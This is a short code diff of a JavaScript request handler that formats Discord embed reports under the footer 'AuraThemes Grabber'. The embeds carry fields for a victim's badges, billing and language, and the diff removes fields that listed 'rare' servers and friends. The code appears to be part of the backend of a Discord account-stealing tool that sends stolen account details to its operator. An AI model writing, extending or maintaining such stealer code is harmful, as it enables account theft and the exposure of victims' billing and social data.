@@ -43,7 +43,7 @@ export default async function handler(req, res) {
       username: '@AuraThemes',
       avatarURL: embed.avatar,
     });
-    
+
     res.status(200).send(data);
   } catch (error) {
     console.error('Error:', error);
@@ -85,9 +85,6 @@ function buildInitializedEmbed(guilds, friends, Discord, data, embed) {
       getField('Badges', Discord.badges, true),
       getField('Billing', Discord.billing, true),
       getField('Langue', Discord.langue, true),
-      getField('\u200b', '**Rare Servers**\n' + guilds, false),
-      getField('\u200b', "\u200b", false),
-      getField('\u200b', '**Rare Friends**\n' + friends, false)
 
     )
     .setFooter({ text: 'AuraThemes Grabber', iconURL: embed.footericon })
